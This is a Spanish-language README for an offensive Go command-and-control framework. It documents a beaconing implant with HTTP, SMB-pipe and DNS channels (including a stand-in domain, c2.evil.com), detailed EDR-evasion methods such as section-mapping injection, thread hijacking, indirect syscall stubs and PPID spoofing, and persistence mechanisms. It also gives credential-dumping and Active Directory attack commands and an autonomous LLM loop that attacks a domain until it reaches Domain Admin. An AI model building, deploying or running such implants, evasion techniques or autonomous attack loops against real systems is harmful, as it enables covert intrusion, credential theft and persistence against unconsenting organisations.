# ENDGAME C2 FRAMEWORK

Framework de Command & Control escrito en Go (~15k líneas). Diseñado para operaciones de red team con énfasis en evasión de EDR, operaciones multi-operador y automatización con IA.

---

## Índice

1. [Arquitectura](#arquitectura)
2. [Transportes del agente](#transportes-del-agente)
3. [Técnicas de inyección y evasión de EDR](#técnicas-de-inyección-y-evasión-de-edr)
4. [Persistencia](#persistencia)
5. [Post-explotación](#post-explotación)
6. [Infraestructura del servidor](#infraestructura-del-servidor)
7. [Credential Vault](#credential-vault)
8. [Control de acceso (RBAC)](#control-de-acceso-rbac)
9. [Modo IA (Ollama)](#modo-ia-ollama)
10. [Reporting con MITRE ATT&CK](#reporting-con-mitre-attck)
11. [Herramientas integradas](#herramientas-integradas)
12. [Quickstart](#quickstart)

---

## Arquitectura

```
┌──────────────┐   mTLS :31337   ┌──────────────────┐   HTTP/mTLS/SMB/DNS
│   Operador   │◄───────────────►│   Teamserver     │◄──────────────────────► Agente
│  (CLI Go)    │                 │   (Go + SQLite)  │
└──────────────┘                 └──────────────────┘
       │                                  │
  Ollama (IA)                    DNS C2 :53 (opcional)
  MITRE Report
```

| Componente | Descripción |
|---|---|
| `server/` | Teamserver: HTTP/mTLS agent transport, operator API (mTLS), SQLite, DNS C2 |
| `agent/` | Implante: Windows EXE/DLL/shellcode, Linux ELF |
| `client/` | CLI del operador: readline, mTLS, IA, reporting |
| `profile/` | Perfil JSON de conexión cliente-servidor |

---

## Transportes del agente

### HTTP / HTTPS-mTLS

Transporte por defecto. Soporta **perfil malleable** configurable en tiempo de compilación:

| Parámetro | Descripción |
|---|---|
| `UserAgent` | User-Agent personalizado (defecto: Chrome 125 en Win10) |
| `BeaconURIs` | Rutas de beacon rotadas (`/search,/api/v1/data,/update`) |
| `HttpHeaders` | Headers extra (`X-Cache-ID:abc;Cookie:session=xyz`) |
| `ProxyURL` | Proxy HTTP (`http://corp-proxy:8080`) |

**Implementación:** `agent/transport_http.go`, `agent/transport_mtls.go`

---

### SMB Named Pipe (P2P Pivot)

Transporte lateral a través de named pipes Windows. Permite agentes **P2P** sin conectividad directa al servidor.

```
Servidor C2 ← HTTP → Agente pivot ← SMB pipe → Agente interno
```

#### Flujo de ataque

1. Obtener un agente en una máquina con acceso al C2 (el **pivot**)
2. Activar el servidor de named pipe en el pivot:
   ```
   link start                        # usa \\.\pipe\redteam por defecto
   link start \\.\pipe\custom        # nombre de pipe personalizado
   ```
3. Compilar un agente hijo con transporte SMB apuntando al pivot:
   ```
   build smb <pivot_ip> 60 20 smb-pipe=\\PIVOT\pipe\redteam
   ```
4. Ejecutar el agente hijo en la máquina interna
5. El agente hijo aparece en `agents` como un agente normal con transporte `smb`

#### Arquitectura del relay

El pivot actúa como proxy transparente:
- **REGISTER**: reenvía JSON al endpoint `/register` del C2 → almacena `agentID` y clave AES del hijo
- **BEACON**: GET `/beacon/<childID>` → desencripta AES-GCM → reenvía tareas en plano al hijo
- **RESULT**: encripta resultado con AES-GCM del hijo → POST `/result/<childID>`

La encriptación AES-GCM es **extremo a extremo** entre el hijo y el C2; el pivot sólo hace bridge de protocolo (HTTP ↔ named pipe).

```
link stop       # detener el servidor de named pipe
```

**Implementación:** `agent/transport_smb_windows.go` (cliente), `agent/pipe_server_windows.go` (servidor pivot)  
**MITRE:** T1090.001 (Internal Proxy), T1021.002 (SMB/Named Pipes)

---

### DNS C2

Transporte encubierto mediante consultas DNS. El servidor actúa como **NS autoritativo** del dominio C2.

#### Protocolo (sobre registros TXT/A):

```
Beacon:      poll.<agentid16>.<c2domain>       → TXT: b32(task_json) | "nil"
Registro:    reg.<b32_chunk>.<seq>.<total>.<agentid>.<c2domain>
Resultado:   res.<b32_chunk>.<seq>.<total>.<taskid>.<agentid>.<c2domain>
Chunking:    chunk.<seq>.<agentid>.<c2domain>  → TXT: "chunk:<b32_data>"
```

- Codificación: Base32 sin padding, chunks de 48 chars (30 bytes/chunk)
- No requiere librería en el agente: implementación DNS raw UDP manual
- Servidor usa `miekg/dns` para NS autoritativo

**MITRE:** T1071.004 — Application Layer Protocol: DNS  
**Implementación:** `server/dns.go`, `agent/transport_dns.go`

---

### WebSocket Tunnel

Túnel WebSocket para acceso al operador a través de Cloudflare Tunnel o similar, sin SSH.

**Implementación:** `server/wstunnel.go`

---

## Técnicas de inyección y evasión de EDR

### El problema con el patrón clásico

El patrón `VirtualAllocEx + WriteProcessMemory + CreateRemoteThread` es detectado por todos los EDRs modernos mediante:

1. **Behavioral rules**: secuencia de las tres llamadas en el mismo proceso
2. **Kernel callbacks**: `PsSetCreateThreadNotifyRoutine` para `CreateRemoteThread`
3. **Inline hooks**: `NtWriteVirtualMemory`, `NtAllocateVirtualMemory`, `NtCreateThreadEx` en ntdll.dll

---

### 1. Section Mapping (sin `WriteProcessMemory` ni `VirtualAllocEx`)

**Fichero:** `agent/inject_evasive_windows.go` → `injectViaSection()`

```
NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)
    ↓
NtMapViewOfSection(local, PAGE_READWRITE)    → vista local RW
    ↓
memcpy(localView, shellcode)                 → escritura sin WPM
    ↓
NtUnmapViewOfSection(local)
    ↓
NtMapViewOfSection(target, PAGE_EXECUTE_READ) → misma memoria física, RX en target
```

**IOCs eliminados:**
- `WriteProcessMemory` / `NtWriteVirtualMemory` → **no se llama**
- `VirtualAllocEx` / `NtAllocateVirtualMemory` (en proceso target) → **no se llama**
- La memoria llega al target con permisos `PAGE_EXECUTE_READ` desde el primer momento (nunca RWX)

`NtCreateSection` y `NtMapViewOfSection` son usadas por millones de aplicaciones legítimas (carga de DLLs, ficheros mapeados) → ratio de detección significativamente menor.

**MITRE:** T1055.001 — Process Injection: Dynamic-link Library Injection

---

### 2. Thread Hijacking (sin `CreateRemoteThread`)

**Fichero:** `agent/inject_evasive_windows.go` → `hijackThread()`

```
CreateProcess(CREATE_SUSPENDED)         → proceso con hilo principal pausado
    ↓
GetThreadContext(mainThread, CONTEXT_FULL)
    ↓
ctx.Rip = remoteShellcodeAddr           → redirige RIP al shellcode
    ↓
SetThreadContext(mainThread, ctx)
    ↓
ResumeThread(mainThread)                → ejecuta shellcode en el hilo legítimo
```

**IOCs eliminados:**
- `CreateRemoteThread` → **no se llama**
- `NtCreateThreadEx` → **no se llama**
- `PsSetCreateThreadNotifyRoutine` (kernel callback) → **no se dispara**

El shellcode se ejecuta en el hilo principal original del proceso, que tiene un call stack completamente legítimo hasta el momento del hijack.

**MITRE:** T1055.003 — Process Injection: Thread Execution Hijacking

---

### 3. Indirect Syscalls — Halos Gate

**Fichero:** `agent/inject_evasive_windows.go` → `extractSSN()`, `makeStub()`, `ntProtectEx()`

Los EDRs hookean funciones en ntdll.dll sobrescribiendo los primeros bytes con un `JMP` a su monitoring code. Los indirect syscalls bypassan esto llamando directamente a la instrucción `syscall` del CPU con el número de syscall (SSN) correcto.

#### Extracción del SSN (Halos Gate)

```go
// Stub normal (no hookeado):
// 4C 8B D1        mov r10, rcx
// B8 XX XX 00 00  mov eax, SSN   ← SSN está en bytes 4-5
// 0F 05           syscall
// C3              ret

// Si hookeado (empieza con E9 JMP):
// Escanear funciones vecinas — SSNs en ntdll son SECUENCIALES
// neighbor_ssn ± delta == target_ssn
```

#### Stub ejecutable (22 bytes)

```asm
4C 8B D1              mov r10, rcx       ; NT calling convention
B8 XX XX 00 00        mov eax, SSN       ; syscall number (patched at runtime)
FF 25 00 00 00 00     jmp [rip+0]        ; indirect jump a gadget
YY YY YY YY YY YY YY YY  <gadget_addr>  ; dirección de 'syscall; ret' en ntdll
```

El gadget `syscall; ret` (bytes `0F 05 C3`) se busca en la sección `.text` de ntdll. Al saltar a un `syscall` dentro de ntdll, el call stack parece legítimo para las detecciones basadas en call-stack spoofing.

**Flujo:**
```
syscall.SyscallN(stubAddr, args...)
    → stub: mov r10,rcx; mov eax,SSN; jmp [gadget]
    → gadget en ntdll: syscall; ret
    → kernel (sin pasar por hooks de userland)
```

Actualmente usado para: `NtProtectVirtualMemory`

**MITRE:** T1562.001 — Impair Defenses: Disable or Modify Tools

---

### 4. PPID Spoofing

**Fichero:** `agent/inject_evasive_windows.go` → `spawnSuspendedSpoofed()`

```go
UpdateProcThreadAttribute(
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    explorerHandle,   // explorer.exe como padre aparente
)
CreateProcess(..., EXTENDED_STARTUPINFO_PRESENT, ...)
```

El proceso sacrificial aparece en el árbol de procesos como hijo de `explorer.exe` en lugar del agente. Rompe heurísticas de árbol de procesos (CrowdStrike Falcon, Defender ATP, Carbon Black).

Si `explorer.exe` no está disponible, fallback a spawn sin spoofing.

**MITRE:** T1134.004 — Access Token Manipulation: Parent PID Spoofing

---

### 5. Sleep Masking

**Fichero:** `agent/persist_windows.go` → `sleepMask()`, integrado en `agent/beacon.go`

Durante el intervalo de sleep del beacon, el agente usa `NtWaitForSingleObject` con un handle a un evento nunca señalizado (timeout) en lugar de `Sleep()`.

```go
// Evita: Sleep(interval) → firma conductual
// Usa:   NtWaitForSingleObject(eventHandle, timeout) → comportamiento idéntico a nivel de CPU
```

El call stack durante el sleep muestra `NtWaitForSingleObject` en lugar de `Sleep`, lo que no coincide con las firmas de "proceso en sleep con RX-memory" que usan EDRs como Elastic y SentinelOne.

Adicionalmente, `encryptRegion()` permite cifrar buffers sensibles (AES key, server URL) con XOR durante el sleep.

**MITRE:** T1027 — Obfuscated Files or Information

---

### 6. Proceso Sacrificial Inteligente

**Fichero:** `agent/forkrun_windows.go` → `forkRun()`

En lugar de usar siempre `svchost.exe` (detectado por frecuencia), se prueba en orden:

```
RuntimeBroker.exe  → proceso legítimo de Windows Runtime, siempre presente
dllhost.exe        → host COM, frecuentemente instanciado
WerFault.exe       → Windows Error Reporting, comportamiento errático normal
svchost.exe        → fallback
```

El proceso puede especificarse manualmente: `forkrun /tmp/beacon.bin C:\Windows\System32\notepad.exe`

---

### 7. Memoria nunca RWX

En todas las implementaciones de inyección:
- Asignación inicial: `PAGE_READWRITE` (escritura)
- Tras escritura: `PAGE_EXECUTE_READ` (ejecución)
- **Nunca** `PAGE_EXECUTE_READWRITE` (RWX)

La presencia de páginas RWX es uno de los indicadores más fiables para EDRs y herramientas como `Get-InjectedThread` de PowerShell.

---

### 8. Inyección local — múltiples métodos

**Fichero:** `agent/inject_windows.go`

| Método | Descripción | Detección |
|---|---|---|
| `thread` | `CreateThread` | Alta |
| `fiber` | `ConvertThreadToFiber` + `SwitchToFiber` | Media |
| `callback` | `EnumSystemLocalesW` como callback | Media-baja |
| `ntthread` | `NtCreateThreadEx` directo | Media |

Configurable en tiempo de compilación: `build http 10.0.0.1 60 20 inject=fiber`

---

### 9. BOF (Beacon Object Files)

**Fichero:** `agent/bof_windows.go`

Ejecuta BOFs (formato COFF de 64 bits) en memoria sin tocar disco. Implementa las APIs del Beacon (`BeaconPrintf`, `BeaconOutput`, `BeaconDataParse`, etc.) y resuelve imports dinámicamente. Compatible con BOFs públicos de Cobalt Strike.

**MITRE:** T1059 — Command and Scripting Interpreter

---

### 10. Sandbox Detection

**Fichero:** `agent/sandbox_windows.go`

Checks activos (configurable: `build http 10.0.0.1 sandbox`):
- Número de procesadores < 2
- RAM < 2 GB
- Procesos de análisis conocidos (Wireshark, x64dbg, Ollydbg, Procmon...)
- Resolución de pantalla < 800×600
- Artefactos de VMware/VirtualBox/QEMU (MAC OUI, nombre de adaptador)
- Tiempo de uptime < 10 minutos

**MITRE:** T1497 — Virtualization/Sandbox Evasion

---

### 11. Working Hours

**Fichero:** `agent/beacon.go` → `inWorkingHours()`

El beacon solo opera dentro de la ventana horaria configurada (`09:00-17:00`). Fuera de ella, duerme hasta el inicio de la siguiente ventana. Reduce exposición durante análisis forense off-hours.

**MITRE:** T1029 — Scheduled Transfer

---

### 12. Kill Date

**Fichero:** `agent/main.go`

El agente se autodestruye (`os.Exit(0)`) si la fecha actual supera la kill date compilada.

```
build http 10.0.0.1 60 20 kill-date=2026-12-31
```

---

### 13. Ofuscación con Garble

Ofusca nombres de funciones, literales de strings y metadata del binario. Elimina información de debug y cambia el hash del binario en cada compilación.

```
build http 10.0.0.1 60 20 garble
```

---

## Persistencia

**Ficheros:** `agent/persist_windows.go`, `agent/persist_stub.go`

### Windows

| Método | Técnica | Privilegios |
|---|---|---|
| `registry` | `HKCU\...\CurrentVersion\Run` | Usuario |
| `schtask` | Tarea programada `ONLOGON` via `schtasks.exe` | Usuario |
| `startup` | `.bat` en carpeta Startup del usuario | Usuario |
| `service` | Servicio Windows via `sc.exe` | Admin |
| `wmi` | Suscripción WMI `CommandLineEventConsumer` | Admin |

**MITRE:** T1547.001 (Run Keys), T1053.005 (Scheduled Tasks), T1543.003 (Windows Service), T1546.003 (WMI Event Subscription)

### Linux

| Método | Técnica | Privilegios |
|---|---|---|
| `crontab` | Entrada `@reboot` en crontab del usuario | Usuario |
| `bashrc` | Entrada en `~/.bashrc` con marcador | Usuario |
| `rc.local` | Entrada en `/etc/rc.local` | Root |
| `systemd` | Servicio systemd (user o system) | Usuario/Root |

**MITRE:** T1053.003 (Cron), T1546.004 (Unix Shell Config)

**Uso:**
```
[agente]> persist registry "C:\Users\bob\AppData\Roaming\svc.exe" WindowsHelper
[agente]> persist crontab "/tmp/agent" redteam
```

---

## Post-explotación

### Capacidades del agente

| Comando | Descripción | MITRE |
|---|---|---|
| `shell <cmd>` | Ejecución de shell | T1059 |
| `ps` | Lista de procesos con usuario y token | T1057 |
| `screenshot` | Captura de pantalla (GDI) | T1113 |
| `download/upload` | Transferencia de ficheros | T1041 |
| `inject <pid> <bin>` | Inyección remota en proceso arbitrario | T1055 |
| `token steal <pid>` | Robo de token de acceso | T1134.001 |
| `token make <user> <pass>` | Creación de token (LogonUser) | T1134.003 |
| `socks <port>` | Proxy SOCKS5 reverso | T1090 |
| `portfwd add <lp> <rh> <rp>` | Port forwarding TCP | T1090 |
| `bof <file> [args]` | Ejecución de Beacon Object File | T1059 |
| `stage2 <file>` | Carga de segunda etapa en memoria | T1055 |
| `persist <method> <cmd>` | Instalación de persistencia | T1547 |
| `forkrun <bin>` | Shellcode en proceso sacrificial | T1055.003 |
| `env` | Lectura de variables de entorno | T1082 |
| `sleep <sec> <jitter>` | Cambio dinámico de intervalo de beacon | — |

---

## Infraestructura del servidor

### Listeners

```
listener start http 8080            # HTTP plain
listener start mtls 8443            # HTTPS mTLS (agentes con cert)
listener start wstunnel 40000       # WebSocket tunnel (Cloudflare)
listener start dns 53 c2.evil.com   # DNS C2 autoritativo
```

### Build del agente

```bash
# Windows EXE estándar
build http 10.0.0.1

# Máxima evasión
build mtls 10.0.0.1 60 20 garble sandbox inject=fiber

# HTML smuggling
build http 10.0.0.1 60 20 format=html

# DLL + shellcode cifrado
build http 10.0.0.1 60 20 format=dll encrypt=aes

# Agente Linux arm64
build http 10.0.0.1 60 20 os=linux arch=arm64

# DNS C2
build dns 8.8.8.8 60 20 dns-domain=c2.evil.com

# Todas las opciones
build http 10.0.0.1 60 20 \
  garble sandbox inject=fiber encrypt=aes \
  kill-date=2026-12-31 \
  user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  beacon-uris=/search,/api/v1/data \
  http-headers="X-Cache-ID:abc123;Cookie:session=xyz" \
  proxy=http://corp-proxy:8080 \
  working-hours=09:00-17:00
```

### Formatos de salida

| Flag | Salida |
|---|---|
| (ninguno) | `agent_amd64.exe` |
| `format=dll` | `agent_amd64.dll` + `agent_amd64.bin` (shellcode) |
| `format=dll encrypt=xor` | + shellcode cifrado XOR + stub C |
| `format=dll encrypt=aes` | + shellcode cifrado AES-256-GCM + stub C |
| `format=html` | + `agent.html` (HTML smuggling) |
| `os=linux` | `agent_amd64` (ELF) |

---

## Credential Vault

Base de datos de credenciales compartida entre todos los operadores.

```
cred list                                         # listar
cred list -q krbtgt                               # filtrar
cred add -u administrator -s 'P@ssw0rd1' -d corp.local -t plaintext
cred add -u krbtgt -s 'aad3b435:819af826' -t ntlm
cred import /tmp/ntds.ntds.ntds                   # importar secretsdump
cred import /tmp/hashes.txt                       # importar hashcat
cred dump                                         # volcar todo (user:secret)
```

**Tipos soportados:** `plaintext`, `ntlm`, `krb5`, `certificate`

**Auto-detección:** Si el secret son 32 chars hex o `LM:NT`, se clasifica automáticamente como `ntlm`.

**Import:** Parsea automáticamente formato secretsdump (`DOMAIN\user:RID:LM:NT:::`) y colon-separated (`user:pass`).

---

## Control de Acceso (RBAC)

Roles basados en el CN del certificado mTLS del operador.

| Rol | Permisos |
|---|---|
| `viewer` | Lectura: agents, results, report, creds |
| `operator` | Todo viewer + tareas + build + creds (escritura) |
| `admin` | Todo + gestión de roles |

```
role list                        # ver roles actuales
role set alice admin             # promover operador
role set bob viewer              # restricción read-only
```

El rol por defecto es `operator` si no se ha asignado ninguno. El primer operador que se conecta debería asignarse `admin` manualmente.

---

## Modo IA (Ollama)

Integración con modelos locales vía Ollama para dos modos de operación.

### Chat interactivo

```
ai chat [-m llama3.1] [-url http://192.168.1.10:11434]
```

El operador describe en lenguaje natural lo que quiere hacer. El LLM propone comandos concretos, el operador confirma (S/n) y el resultado se envía de vuelta al LLM para análisis.

### Pentest autónomo

```
ai auto 10.10.10.100 -d corp.local [-m llama3.1]
```

Loop completamente autónomo hasta obtener Domain Admin:
1. El LLM recibe un system prompt con todos los comandos disponibles y metodología MITRE
2. Propone y ejecuta un comando
3. Analiza el output
4. Decide el siguiente paso
5. Repite (máx. 40 iteraciones o hasta `[DA]` en el output del LLM)

**Variables de entorno:** `OLLAMA_HOST` (fallback si no se especifica `-url`)

---

## Reporting con MITRE ATT\&CK

```
report                    # genera report_YYYY-MM-DD_HHMMSS.html
report --ai -m llama3.1   # + resumen ejecutivo generado por LLM
```

El reporte HTML auto-contenido incluye:

- **Estadísticas**: agentes comprometidos, tareas ejecutadas, credenciales obtenidas, técnicas usadas
- **Matriz MITRE ATT&CK**: grid visual con todas las técnicas/tácticas identificadas, coloreadas por táctico
- **Timeline**: historial completo de comandos con timestamps, operador, output colapsable
- **Tabla de agentes**: hosts comprometidos, usuario, OS, transport, estado
- **Resumen ejecutivo** (con `--ai`): 3-5 párrafos nivel CISO generados por el LLM

### Mapeo MITRE automático

Todos los comandos del cliente y del agente se mapean automáticamente a técnicas ATT&CK:

| Comando | Técnica | Táctica |
|---|---|---|
| `scan` | T1046 Network Service Discovery | Discovery |
| `spray` | T1110.003 Password Spraying | Credential Access |
| `asrep` | T1558.004 AS-REP Roasting | Credential Access |
| `kerberoast` | T1558.003 Kerberoasting | Credential Access |
| `secretsdump` | T1003.003 NTDS + T1003.002 SAM | Credential Access |
| `bloodhound` | T1069.002 Domain Groups | Discovery |
| `wmiexec` | T1047 WMI | Execution |
| `psexec` | T1021.002 SMB/Admin Shares | Lateral Movement |
| `certipy` | T1649 Steal/Forge Certs | Credential Access |
| `persist registry` | T1547.001 Run Keys | Persistence |
| `token steal` | T1134.001 Token Impersonation | Privilege Escalation |
| `socks` | T1090 Proxy | Command & Control |
| `forkrun` | T1055.003 Thread Hijacking | Defense Evasion |
| `inject` | T1055 Process Injection | Defense Evasion |

---

## Herramientas integradas

### Active Directory

```
# Enumeración
enum 10.0.0.1 -u user -p pass         # SMB: shares, users, groups, pass-pol
bloodhound 10.0.0.1 -d corp -u u -p p # recolección BloodHound completa
getadusers 10.0.0.1 -d corp -u u -p p # usuarios via LDAP
finddelegation 10.0.0.1 -d corp -u u  # delegaciones

# Kerberos
kerberoast 10.0.0.1 -d corp -u u -p p # SPNs + auto john
asrep 10.0.0.1 -d corp -u users.txt   # AS-REP roasting
gettgt 10.0.0.1 -d corp -u u -p p     # solicitar TGT
getst 10.0.0.1 -d corp -u u -spn http/srv  # S4U2Self/S4U2Proxy

# Escalada
dacledit 10.0.0.1 -d corp -u u -action write -rights FullControl -principal evil
rbcd 10.0.0.1 -d corp -u u -action write -delegate-from evil$ -delegate-to dc$
addcomputer 10.0.0.1 -d corp -u u -p p

# ADCS (Certipy)
certipy find 10.0.0.1 -u u@corp -p p -vulnerable
certipy req 10.0.0.1 -u u@corp -p p -ca corp-CA -template User -upn admin@corp
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1
```

### Ejecución remota (Impacket)

```
wmiexec 10.0.0.1 -u admin -p pass -d corp "whoami /all"
psexec  10.0.0.1 -u admin -H aad3b:8d969eef -d corp
smbexec 10.0.0.1 -u admin -p pass
dcomexec 10.0.0.1 -u admin -p pass "ipconfig"
```

### Volcado de credenciales

```
secretsdump 10.0.0.1 -u admin -p pass -d corp   # DCSync completo
secretsdump 10.0.0.1 -u localadmin -p pass       # SAM local
getlaps 10.0.0.1 -d corp -u u -p p              # LAPS passwords
dpapi masterkey -target user -sid S-1-5-...      # DPAPI
```

---

## Quickstart

### Servidor (una sola vez)

```bash
go build -o bin/c2-server ./cmd/server/
./bin/c2-server

# Generar perfil de operador
./bin/c2-server new-operator -name alice
# → alice.json (conectar vía SSH tunnel)

# Con WebSocket tunnel (sin SSH, desde cualquier red)
./bin/c2-server new-operator -name alice -via-ws wss://<uuid>.trycloudflare.com/ws
```

### Cliente

```bash
go build -o bin/redteam-client ./cmd/client/
./bin/redteam-client -profile alice.json
```

### Opción A — SSH tunnel

```bash
ssh -L 31337:127.0.0.1:31337 user@<vps> -N &
redteam-client -profile alice.json
```

### Opción B — Cloudflare Tunnel

```bash
# En el servidor:
listener start wstunnel 40000
cloudflared tunnel --url http://127.0.0.1:40000

# El operador usa directamente el perfil con via_ws ya configurado
redteam-client -profile alice.json
```

### Flujo típico de operación

```
# 1. Compilar agente
build http 10.0.0.1 60 20 garble sandbox inject=fiber

# 2. Servir y ejecutar en target (out-of-band)
# ...

# 3. Cuando el agente hace beacon:
agents
use <TAB>

# 4. Post-explotación
shell whoami /all
ps
token steal 4321
socks 1080

# 5. Recolección AD
bloodhound 10.0.0.1 -d corp.local -u 'svc$' -p password
kerberoast 10.0.0.1 -d corp.local -u 'svc$' -p password

# 6. Guardar credenciales obtenidas
cred import /tmp/secretsdump.txt
cred add -u administrator -s 'aad3b:8d969eef' -t ntlm -d corp.local

# 7. Reporte final
report --ai -m llama3.1
```

---

## Dependencias

| Paquete | Uso |
|---|---|
| `golang.org/x/sys/windows` | Windows API (VirtualProtect, CreateProcess, token APIs...) |
| `github.com/miekg/dns` | Servidor DNS C2 autoritativo |
| `modernc.org/sqlite` | Base de datos embebida (agentes, tasks, creds, roles) |
| `github.com/chzyer/readline` | CLI con historial, TAB completion |
| `github.com/gorilla/websocket` | Túnel WebSocket para el operador |
| `github.com/google/uuid` | IDs de agentes |

---

## Resumen de técnicas MITRE ATT&CK

| ID | Nombre | Implementación |
|---|---|---|
| T1071.004 | DNS C2 | `server/dns.go`, `agent/transport_dns.go` |
| T1055.001 | DLL Injection (Section Mapping) | `inject_evasive_windows.go` |
| T1055.003 | Thread Execution Hijacking | `inject_evasive_windows.go` |
| T1134.004 | PPID Spoofing | `inject_evasive_windows.go` |
| T1562.001 | Indirect Syscalls (Halos Gate) | `inject_evasive_windows.go` |
| T1027 | Sleep Masking | `persist_windows.go`, `beacon.go` |
| T1497 | Sandbox Evasion | `sandbox_windows.go` |
| T1547.001 | Registry Run Keys | `persist_windows.go` |
| T1053.005 | Scheduled Task | `persist_windows.go` |
| T1543.003 | Windows Service | `persist_windows.go` |
| T1546.003 | WMI Event Subscription | `persist_windows.go` |
| T1053.003 | Cron | `persist_stub.go` |
| T1134.001 | Token Impersonation/Theft | `commands_windows.go` |
| T1090 | SOCKS Proxy | `agent/socks.go` |
| T1059.003 | Windows Command Shell | `agent/commands.go` |
| T1113 | Screen Capture | `commands_windows.go` |
| T1041 | Exfiltration over C2 | `transport_http.go` |
| T1558.003 | Kerberoasting | `client/local.go` |
| T1558.004 | AS-REP Roasting | `client/local.go` |
| T1003.003 | NTDS | `client/local.go` |
| T1649 | Steal/Forge Certs (ADCS) | `client/certipy.go` |
| T1029 | Scheduled Transfer (Working Hours) | `agent/beacon.go` |
